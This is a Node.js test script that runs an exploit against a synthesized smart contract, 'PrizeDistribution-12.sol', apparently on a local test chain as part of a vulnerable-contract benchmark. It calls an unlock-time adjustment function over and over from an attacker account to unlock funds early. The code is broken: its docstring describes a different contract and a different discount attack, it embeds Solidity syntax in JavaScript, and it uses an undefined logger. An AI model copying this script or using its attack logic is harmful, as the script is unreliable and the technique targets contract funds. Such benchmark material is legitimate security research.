require('module-alias/register');
const fs = require('fs');
const path = require('path');
const assert = require('assert');
const chalk = require('chalk');
const { 
    extractSolcVersion, 
    compileWithVersion, 
    deployContract 
} = require('@lib/web3/deploy');

const { setTimeout } = require('timers');
const { sleep } = require('@lib/os/process');
const { createLoggerWeb3 } = require('@lib/web3/deploy');

// It seems module alias does not work with js path, so, we will resort to the dirty approach.
const projectRoot = path.resolve(__dirname, '..', '..', '..'); 
const contractsDir = path.join(projectRoot, './contracts');
const contractFileFullName = 'PrizeDistribution-12.sol';
let source = fs.readFileSync(path.join(contractsDir, 'src', 'synthesized', contractFileFullName), 'utf8');
let solcVersion = extractSolcVersion(source);


/**
 * Attempts to exploit a vulnerability in the ProductOrder smart contract.
 * 
 * The exploit involves applying a discount just before the discountEndTime, 
 * waiting for a few seconds, then making a transaction to pay for the order 
 * at the discounted price, and finally confirming the order.
 * 
 * @param {Object} web3 - The Web3 instance.
 * @param {Object} envInfo - An object containing environment information such as accounts, privateKeys, and rpcAddress.
 * @returns {Promise<boolean>} A promise that resolves to `true` if the exploit is successful, `false` otherwise.
 * @throws {Error} If there's an error during the exploit process.
 */
async function exploit(web3, envInfo, contractAddress) {
    try {
        let { abi } = await compileWithVersion(source, contractFileFullName, 'PrizeDistribution', solcVersion);
        let contractInstance = new web3.eth.Contract(abi, contractAddress);
        let attackerAccount = envInfo.accounts[1];  // Use an attacker's account

        console.log("Attempting to manipulate unlock time...");

        // Calculate how many times we need to call the function to bring the unlock time to the present or past
        let initialUnlockTime = await contractInstance.methods.unlockTime().call();
        let currentTime = Math.floor(Date.now() / 1000);
        let timeDifference = initialUnlockTime - currentTime; // Time in seconds

        // We need enough calls to reduce the unlock time significantly
        let numberOfCallsNeeded = Math.ceil(timeDifference / (address(this).balance / 1000));

        console.log(`Initial unlock time: ${initialUnlockTime}, Current time: ${currentTime}`);
        console.log(`Time difference: ${timeDifference} seconds, Number of calls needed: ${numberOfCallsNeeded}`);

        // Perform the required number of calls
        for (let i = 0; i < numberOfCallsNeeded; i++) {
            await contractInstance.methods.adjustUnlockTimeBasedOnBalance().send({
                from: attackerAccount,
                gas: 300000
            });
            await sleep(200);
        }

        console.log("Unlock time manipulation attempt complete.");

        // Verify the new unlock time
        let newUnlockTime = await contractInstance.methods.unlockTime().call();
        console.log(`New unlock time: ${newUnlockTime}`);

        if (newUnlockTime <= currentTime) {
            console.log("Unlock time successfully manipulated to the current time or earlier.");
            return true; // Exploit successful
        } else {
            console.error("Failed to manipulate unlock time sufficiently.");
            return false; // Exploit failed
        }
    } catch (error) {
        console.error(error.stack);
        return false;
    }
}














/**
 * Executes the exploit and checks its result
 * 
 * This function will run the exploit and then verify if the exploit has 
 * yielded the predicted result. If the exploit is successful, a success 
 * message is displayed, otherwise an error message is shown.
 * 
 * @param {Object} web3 - The Web3 instance.
 * @param {Object} envInfo - An object containing environment information such as accounts, privateKeys, and rpcAddress.
 * @returns {Promise<boolean>} A promise that resolves to `true` if the test is successful, `false` otherwise.
 * @throws {Error} If there's an error during the test execution.
 */
module.exports = async function runTests(web3, envInfo, contractAddress) {
    // envInfo.accounts, envInfo.privateKeys, and envInfo.rpcAddress should be available from Anvil 
    
    web3 = await createLoggerWeb3(web3);
    // Execute the exploit
    let result = await exploit(web3, envInfo, contractAddress);

    // See if exploit has yielded the predicted result (a very manual oracle!)
    assert.strictEqual(result, true, "Exploit did not yield the expected result");
    logger.info(chalk.green("Exploit successful!"));

    return result; 
}
